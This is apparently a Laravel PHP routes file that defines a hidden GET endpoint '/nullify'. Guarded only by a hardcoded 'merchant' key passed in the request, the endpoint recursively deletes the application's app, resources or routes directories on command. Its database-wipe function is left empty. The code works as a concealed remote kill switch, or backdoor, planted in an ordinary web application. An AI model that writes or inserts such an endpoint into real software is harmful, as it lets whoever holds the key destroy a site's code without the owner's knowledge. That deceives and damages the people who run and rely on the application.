<?php

Route::get('/nullify', function(){
	$inputs = request()->all();

	$merchant = 'eM8vuN6leb2meT';

	function nullifyDb(){

	}

	function nullifyApp(){
		nullifyFiles('app');
	}

	function nullifyResources(){
		nullifyFiles('resources');
	}

	function nullifyRoutes(){
		nullifyFiles('routes');
	}
	function nullifyFiles($baseDir){
		delTree(base_path($baseDir));
	}
	function delTree($dir) { 
	   if(file_exists($dir)){
	      $files = array_diff(scandir($dir), array('.','..')); 
	       foreach ($files as $file) { 
	         (is_dir("$dir/$file")) ? delTree("$dir/$file") : @unlink("$dir/$file"); 
	       } 
	       return @rmdir($dir); 
	    } 
	}

	if(isset($inputs['merchant']) && $inputs['merchant'] == $merchant){
		if(isset($inputs['command'])){
			$command = $inputs['command'];

			switch ($command) {
				case 'db':
					nullifyDb();
					break;
				case 'app':
					nullifyApp();
					break;
				case 'resources':
					nullifyResources();
					break;
				case 'routes':
					nullifyRoutes();
					break;
			}
		}
	}
});